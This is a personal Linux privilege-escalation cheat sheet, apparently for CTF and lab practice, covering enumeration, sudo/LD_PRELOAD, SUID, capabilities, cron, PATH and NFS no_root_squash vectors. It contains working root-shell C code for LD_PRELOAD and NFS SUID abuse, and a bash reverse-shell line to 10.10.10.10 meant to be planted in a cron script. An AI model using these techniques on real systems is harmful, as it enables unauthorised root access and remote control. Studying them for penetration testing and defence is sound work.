# Linux PrivEsc

This'll act as my cheat sheet for privilege escalation in Linux box's.

## Enumeration

### Hostname
<b>hostname</b> returns the name of the current host. This can sometimes return useful information.

### uname -a
Print system information giving detailed information about the kernel used by the system.

### /proc/version
Provides information about the target system process. This can give information about kernel version and additional data such as whether a compiler is installed.

### /etc/issue
File contains information about the operating system

### ps
Effective way to see any running processes. The output of ps command is as follows
<ul>
	<li>PID: The process ID</li>
	<li>TTY: Terminal type ussed by the user</li>
	<li>Time: Amount of CPU time used by the process</li>
	<li>CMD: The command or executable running</li>
</ul>

```bash
ps

PID TTY          TIME CMD
2248 pts/3    00:00:00 zsh
2409 pts/3    00:00:09 sublime_text
2501 pts/3    00:00:00 plugin_host-3.3
2504 pts/3    00:00:01 plugin_host-3.8
5406 pts/3    00:00:00 ps
```

ps provides a few useful options:
<ul>
	<li>ps -A: View all running processes</li>
	<li>ps axjf: View process tree</li>
	<li>ps aux: The aux optoins shows processes for all users
</ul>

### env
Shows environmental variables. 

```bash
env

COLORFGBG=15;0                       
COLORTERM=truecolor                 
COMMAND_NOT_FOUND_INSTALL_PROMPT=1   
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus    
DESKTOP_SESSION=lightdm-xsession   
DISPLAY=:0.0                             
DOTNET_CLI_TELEMETRY_OPTOUT=1            
GDMSESSION=lightdm-xsession                                                                                          
GDM_LANG=en_US.utf8                         
GTK_MODULES=gail:atk-bridge
HOME=/home/kali
LANG=en_US.UTF-8
```
The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalatoin.

### sudo -l
List all commands your user can run using sudo

### id
General overview of the user's privilege level and group membership.
```bash
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```

### /etc/passwd
Get a list of users on the system. For brute force attacks<br>
```bash
cat /etc/passwd | grep home | cut -d ':' -f 1
```

### ifconfig
Machine may be used for pivoting to another network. Use ifconfig to see all interfaces. Once confirmed run <b>ip route</b> to see if a route to the network exists.

### netstat
Checking for interfaces and network routes, it is worth looking into existing communications. The netstat command can be used with several different options to gather information on existing connections.
<ul>
	<li>netstat -a: Shows all listening ports and established connections</li>
	<li>netstat -at (netstat -au): Show listening TCP and/or UDP protocols </li>
	<li>netstat -tp: Lists connections with the service name and PID information</li>
	<li>netstat -i: show interface statistics.</li>
</ul>

### find Command
Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in "find" command is useful and worth keeping. 
Find files:
<ul>
	<li>find / -type d -name config : Find the directory name config under '/'</li>
	<li>find / -type f -perm 0777 : Find files with the 777 permissions (files readable, writable, and executable by all users)</li>
	<li>find / -perm a=x : find executable files</li>
	<li>find / -perm -o x -type d 2> /dev/null : Find world-executable folders</li>
	<li>find / -perm -u=s -type f 2> /dev/null : find files with the SUID bit, which allows us to run the file with higher privilege level than the current user</li>
	<li>find / -type -perm -04000 -ls 2> /dev/null: list all files that have SUID or SGID bits set</li>
</ul>

## Automated Enumeration Tools
<ul>
	<li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPeas</a></li>
	<li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
	<li><a href="https://github.com/mzet-/linux-exploit-suggester">Linux Exploit Suggester (LES)</a></li>
	<li><a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart Enumeration</a></li>
	<li><a href="https://github.com/linted/linuxprivchecker">Linux Priv Checker</a></li>
</ul>

## Kernel Exploits
The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.<br>
The Kernel exploit methodology is simple;
1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit
Note: Failing a kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration test. 

## Sudo
Checking what you can run sudo with <b>sudo -l</b>.
Then use <a href="https://gtfobins.github.io/">GTFObin</a> to determine what programs can be exploitable with the privileges.

### Leverage application functions
Some applications will not have a known exploit within this context. Such as Apache2 server. You can leak information leveraging function of the application. Loading alternative files using -f. Loading /etc/shadow file. 

### Leverage LD_PRELOAD
On some systems, you may see the LD_PRELOAD environment option. LD_PRELOAD is a function that allows any program to use shared libraries. <a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">Here</a> is more information about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run.<br>
The vector follow;
1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing ot our .so file
A simple C program will spawn a root shell
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```
Save and compile:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo. <br>
We need to run the program by specifying the LD_PRELOAD option, as follows;
```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

## SUID
Looking for the SUID or SGID bits set for any applications. We specifically want it to where we can evelate to root temporarily.
```bash
find / -type f -perm -04000 -ls 2> /dev/null
```

## Capabilities
Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the sys admin does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user. We can use the getcap tool to list enabled capabilities.
```bash
$ getcap -r / 2> /dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
$ ls -la /usr/bin/vim
lrwxrwxrwx 1 root root 21 Oct 26  2020 /usr/bin/vim -> /etc/alternatives/vim
```
Note that vim does not have the SUID bit set and thus would not show up during our find command.

## Cron Jobs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions. The idea is simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges. Our goal will be to find a cron job set by root and have it run our script, ideally a shell.<br>
Any user can read the file keeping system-wide cron jobs under <b>/etc/crontab</b>
Modyfing shell scripts:
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
```
Sometimes sys admins remove files that are configured to run as root but don't remove the cronjob for it. Thus, if a cronjob for a program/script does not exist, you can write a script to replace it.

## PATH
If a folder for which your user has write permissions is located in the path, you could hijack an application to run a script. PATH is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. This exploitation method depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.
1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?
To start, we look for any writable folders listed under PATH we could create a binary named thm under that directory and have our "path" script run it. As the SUIDbit is set, this binary will run with root privileges.<br>
Find writable folders with:
```bash
find / -writable 2> /dev/null | cut -d '/' -f 2,3 | grep -v proc | sort -u
find / -writeable 2> /dev/null | grep usr | cut -d '/' -f 2,3 | sort -u
```
Then compare with what's in PATH
```bash
echo $PATH
```

If the application is in path, has the SUID bit set for root, then whatever application is being ran from path can be modified to execute arbitrariy code. 

## NFS
Privilege escalation is not confined to internal access. Shared folder and remote managemtn interfaces such as SSH and TELNET can also help you gain root access on the target system. for example, finding a root SSH private key on the target system and connecting via SSH with root privileges instead to increase your current user's privilege level.<br>
Another vector that is more relevant to CTFs and exams is misconfigured network shell. Network File Sharing (NFS) configuration is kept in the /etc/exports file. This is created during the NFS installatino and can usually be read by users.
```bash
$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
The critical element for this prvilege escalation vector is the "no_root_squash" option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the "no_root_squash" option is preset on a writable share, we can create an executable with SUID bit set and run it on the target system. <br>

Start by enumerating mountable shares from our attacking machine<br>
```bash
kali@kali:~/Documents/CTF/tryhackme/priv_esc$ showmount -e 0.0.0.0  
Export list for 10.10.192.122:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```
Mount one of the "no_root_squash" shares to our attacking machine and start building our executable. 
```bash
mount -o rw 0.0.0.0:/NO_ROOT_SQUASH_DIR /store/dir/here
```
Write and compile this application as root. Add SUID bit.
```C
void main() {
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return;
}
```
```bash
sudo gcc pwn.c -o pwn && chmod +s pwn
```
Hop over to the shared drive on the remote machine. You can execute this to get root shell. Don't forget to clean up!<br>
```
umount /store/dir/here
```